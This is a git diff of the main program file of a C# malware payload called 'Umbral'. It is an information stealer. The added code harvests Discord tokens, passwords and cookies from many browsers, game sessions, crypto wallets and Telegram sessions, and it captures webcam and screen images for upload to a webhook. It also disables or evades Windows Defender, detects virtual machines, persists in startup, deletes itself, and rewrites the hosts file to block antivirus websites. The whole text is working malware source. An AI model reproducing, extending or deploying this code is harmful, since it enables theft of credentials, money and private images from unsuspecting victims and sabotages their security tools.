@@ -2,39 +2,70 @@
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Umbral.payload.AntiVm;
-using Umbral.payload.Browsers;
-using Umbral.payload.Config;
-using Umbral.payload.Discord;
+using Umbral.payload.Components.AntiVM;
+using Umbral.payload.Components.Browsers;
+using Umbral.payload.Components.Crypto;
+using Umbral.payload.Components.Messenger.Discord;
+using Umbral.payload.Components.Messenger.Telegram;
+using Umbral.payload.Components.Utilities;
 using Umbral.payload.Games.Minecraft;
 using Umbral.payload.Games.Roblox;
 using Umbral.payload.Postman;
-using Umbral.payload.Utilities;
 using Umbral.payload.Webcam;
 
 namespace Umbral.payload
 {
-    internal static class Program
+    internal class Program
     {
-        static private async Task Main()
+        static private async Task Main(string[] args)
         {
+
 #if DEBUG
             MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             Environment.Exit(1);
 #endif
-
             await Process();
             await Run();
+        }
+
+        static private async Task Process()
+        {
+            if (string.IsNullOrWhiteSpace(Settings.Webhook)) Environment.Exit(1); // Empty webhook
+
+            Syscalls.RegisterMutex();
+
+            while (!await Common.IsConnectionAvailable())
+                Thread.Sleep(60000); // Connection available. Retry every 1 min.
+
+            if (Settings.AntiVm &&
+                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.
+
+            if (!Common.IsInStartup())
+            {
+                Syscalls.AskForAdmin(); // Prompts user to give admin privileges
+            }
+
+            if (Settings.Melt && !Common.IsInStartup())
+                Syscalls.HideSelf();
+
+            Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
+            Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.
+
+            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
+                Common.PutInStartup(); // Puts itself in startup
         }
 
         static private async Task Run()
         {
             string archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");
 
-            retry:
+        retry:
             string tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
             if (Directory.Exists(tempFolder))
                 try
@@ -57,54 +88,54 @@ namespace Umbral.payload
                 Environment.Exit(1);
             }
 
-            var getTokens = TokenStealer.GetAccounts();
+            if (Settings.BlockAvSites && Syscalls.CheckAdminPrivileges()) BlockAvSites();
+            var getTokens = Settings.StealDiscordTokens ? TokenStealer.GetAccounts() : Task.Run(() => new DiscordAccountFormat[] { });
 
-            var getBravePasswords = Brave.GetPasswords();
-            var getChromePasswords = Chrome.GetPasswords();
-            var getChromiumPasswords = Chromium.GetPasswords();
-            var getComodoPasswords = Comodo.GetPasswords();
-            var getEdgePasswords = Edge.GetPasswords();
-            var getEpicPrivacyPasswords = EpicPrivacy.GetPasswords();
-            var getIridiumPasswords = Iridium.GetPasswords();
-            var getOperaPasswords = Opera.GetPasswords();
-            var getOperaGxPasswords = OperaGx.GetPasswords();
-            var getSlimjetPasswords = Slimjet.GetPasswords();
-            var getUrPasswords = UR.GetPasswords();
-            var getVivaldiPasswords = Vivaldi.GetPasswords();
-            var getYandexPasswords = Yandex.GetPasswords();
+            var getBravePasswords = Settings.StealPasswords ? Brave.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getChromePasswords = Settings.StealPasswords ? Chrome.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getChromiumPasswords = Settings.StealPasswords ? Chromium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getComodoPasswords = Settings.StealPasswords ? Comodo.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getEdgePasswords = Settings.StealPasswords ? Edge.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getEpicPrivacyPasswords = Settings.StealPasswords ? EpicPrivacy.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getIridiumPasswords = Settings.StealPasswords ? Iridium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getOperaPasswords = Settings.StealPasswords ? Opera.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getOperaGxPasswords = Settings.StealPasswords ? OperaGx.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getSlimjetPasswords = Settings.StealPasswords ? Slimjet.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getUrPasswords = Settings.StealPasswords ? UR.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getVivaldiPasswords = Settings.StealPasswords ? Vivaldi.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
+            var getYandexPasswords = Settings.StealPasswords ? Yandex.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
 
-            var getBraveCookies = Brave.GetCookies();
-            var getChromeCookies = Chrome.GetCookies();
-            var getChromiumCookies = Chromium.GetCookies();
-            var getComodoCookies = Comodo.GetCookies();
-            var getEdgeCookies = Edge.GetCookies();
-            var getEpicPrivacyCookies = EpicPrivacy.GetCookies();
-            var getIridiumCookies = Iridium.GetCookies();
-            var getOperaCookies = Opera.GetCookies();
-            var getOperaGxCookies = OperaGx.GetCookies();
-            var getSlimjetCookies = Slimjet.GetCookies();
-            var getUrCookies = UR.GetCookies();
-            var getVivaldiCookies = Vivaldi.GetCookies();
-            var getYandexCookies = Yandex.GetCookies();
+            var getBraveCookies = Settings.StealCookies ? Brave.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getChromeCookies = Settings.StealCookies ? Chrome.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getChromiumCookies = Settings.StealCookies ? Chromium.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getComodoCookies = Settings.StealCookies ? Comodo.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getEdgeCookies = Settings.StealCookies ? Edge.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getEpicPrivacyCookies = Settings.StealCookies ? EpicPrivacy.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getIridiumCookies = Settings.StealCookies ? Iridium.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getOperaCookies = Settings.StealCookies ? Opera.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getOperaGxCookies = Settings.StealCookies ? OperaGx.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getSlimjetCookies = Settings.StealCookies ? Slimjet.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getUrCookies = Settings.StealCookies ? UR.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getVivaldiCookies = Settings.StealCookies ? Vivaldi.GetCookies() : Task.Run(() => new CookieFormat[] { });
+            var getYandexCookies = Settings.StealCookies ? Yandex.GetCookies() : Task.Run(() => new CookieFormat[] { });
 
-            var getRobloxCookies = RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies,
-                getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies);
+            var getRobloxCookies = Settings.StealGames ? RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies,
+                getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies) : Task.Run(() => new string[] { });
 
-            var getMinecraftFiles = Task.Run(() => false);
-            if (Settings.StealMinecraftFiles)
-                getMinecraftFiles =
-                    MinecraftStealer.StealMinecraftFiles(Path.Combine(tempFolder, "Games", "Minecraft"));
+            var getMinecraftFiles = Settings.StealGames ? MinecraftStealer.StealMinecraftSessionFiles(Path.Combine(tempFolder, "Games", "Minecraft")) : Task.Run(() => 0);
 
-            var captureWebcam = Task.Run(() => new Dictionary<string, Bitmap>());
-            if (Settings.CaptureWebcam)
-                captureWebcam = ImageCapture.CaptureWebcam();
+            var captureWebcam = Settings.TakeWebcamSnapshot ? ImageCapture.CaptureWebcam() : Task.Run(() => new Dictionary<string, Bitmap>());
+
+            var stealWallets = Settings.StealWallets ? WalletStealer.StealWallets(Path.Combine(tempFolder, "Wallets")) : Task.Run(() => 0);
+
+            var stealTelegramSessions = Settings.StealTelegramSessions ? SessionStealer.StealSessions(Path.Combine(tempFolder, "Messenger", "Telegram")) : Task.Run(() => 0);
 
             await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
                 getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
                 getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
                 getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
                 getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
-                getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam);
+                getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam, stealWallets);
 
             var discordAccounts = await getTokens;
 
@@ -138,7 +169,9 @@ namespace Umbral.payload
 
             string[] robloxCookies = await getRobloxCookies;
 
-            int gotMinecraftFiles = await getMinecraftFiles ? 1 : 0;
+            int minecraftSessionFilesCount = await getMinecraftFiles;
+            int walletsCount = await stealWallets;
+            int telegramSessionCount = await stealTelegramSessions;
 
             var screenshots = Common.CaptureScreenShot();
 
@@ -152,9 +185,9 @@ namespace Umbral.payload
             int screenshotCount = 0;
             int webcamImagesCount = 0;
 
-            if (discordAccounts.Length > 0 && Settings.StealDiscordtokens)
+            if (discordAccounts.Length > 0 && Settings.StealDiscordTokens)
             {
-                string saveTo = Path.Combine(tempFolder, "Discord");
+                string saveTo = Path.Combine(tempFolder, "Messenger", "Discord");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                 discordTokenCount += discordAccounts.Length;
@@ -168,15 +201,13 @@ namespace Umbral.payload
                 screenshotCount += screenshots.Length;
             }
 
-            if (webcamImages.Count > 0 && Settings.CaptureWebcam)
+            if (webcamImages.Count > 0 && Settings.TakeWebcamSnapshot)
             {
                 string saveTo = Path.Combine(tempFolder, "Webcam");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(webcamImages, saveTo)));
                 webcamImagesCount += webcamImages.Count;
             }
-
-            #region StealPaswords
 
             if (bravePasswords.Length > 0 && Settings.StealPasswords)
             {
@@ -282,10 +313,6 @@ namespace Umbral.payload
                 passwordsCount += yandexPasswords.Length;
             }
 
-            #endregion
-
-            #region StealCookies
-
             if (braveCookies.Length > 0 && Settings.StealCookies)
             {
                 string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
@@ -390,15 +417,13 @@ namespace Umbral.payload
                 cookiesCount += yandexCookies.Length;
             }
 
-            if (robloxCookies.Length > 0 && Settings.StealRobloxCookies)
+            if (robloxCookies.Length > 0 && Settings.StealGames)
             {
                 string saveTo = Path.Combine(tempFolder, "Games", "Roblox");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(robloxCookies, Path.Combine(saveTo, "Roblox Cookies.txt")));
                 robloxCookieCount += robloxCookies.Length;
             }
-
-            #endregion
 
 
             await Task.WhenAll(saveProcesses);
@@ -409,10 +434,12 @@ namespace Umbral.payload
                     { "Cookies", cookiesCount },
                     { "Passwords", passwordsCount },
                     { "Discord Tokens", discordTokenCount },
-                    { "Minecraft Session Files", gotMinecraftFiles },
+                    { "Minecraft Session Files", minecraftSessionFilesCount },
                     { "Roblox Cookies", robloxCookieCount },
                     { "Screenshots", screenshotCount },
-                    { "Webcam", webcamImagesCount }
+                    { "Webcam", webcamImagesCount },
+                    { "Wallets", walletsCount},
+                    { "Telegram Sessions", telegramSessionCount },
                 });
                 File.Delete(archivePath);
             }
@@ -422,35 +449,59 @@ namespace Umbral.payload
             }
 
             Directory.Delete(tempFolder, true);
-            if (Settings.DeleteSelf && !Common.IsInStartup())
+            if (Settings.Melt && !Common.IsInStartup())
                 Syscalls.DeleteSelf();
         }
 
-        static private async Task Process()
+        static private async void BlockAvSites()
         {
-            if (string.IsNullOrWhiteSpace(Settings.WebhookUrl)) Environment.Exit(1); // Empty webhook
-
-            Syscalls.RegisterMutex();
-
-            while (!await Common.IsConnectionAvailable())
-                Thread.Sleep(60000); // Connection available. Retry every 1 min.
-
-            if (Settings.AntiVm &&
-                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.
-
-            if (!Common.IsInStartup())
+            try
             {
-                Syscalls.AskForAdmin(); // Prompts user to give admin privileges
+                var bannedSites = new[] { "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com" };
+                var newData = new List<string>();
+                string data;
+                var hostsFilePath = Path.Combine(Environment.GetEnvironmentVariable("systemroot"), "System32", "drivers", "etc", "hosts");
+
+                if (File.Exists(hostsFilePath))
+                {
+                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    {
+                        using (var reader = new StreamReader(fileStream))
+                        {
+                            data = await reader.ReadToEndAsync();
+                        }
+                    }
+
+                    foreach(var line in data.Split('\n'))
+                    {
+                        if (!bannedSites.Any(x => line.Contains(x)))
+                        {
+                            newData.Add(line);
+                        }
+                    }
+
+                    foreach(var site in bannedSites)
+                    {
+                        newData.Add($"\t0.0.0.0 {site}");
+                        newData.Add($"\t0.0.0.0 www.{site}");
+                    }
+
+                    data = string.Join("\n", newData);
+                    data = data.Replace("\n\n", "\n");
+
+                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
+                    {
+                        using (var writer = new StreamWriter(fileStream))
+                        {
+                            await writer.WriteAsync(data);
+                        }
+                    }
+                }
             }
-
-            if (Settings.DeleteSelf && !Common.IsInStartup())
-                Syscalls.HideSelf();
-
-            Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
-            Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.
-
-            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
-                Common.PutInStartup(); // Puts itself in startup
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
         }
     }
 }
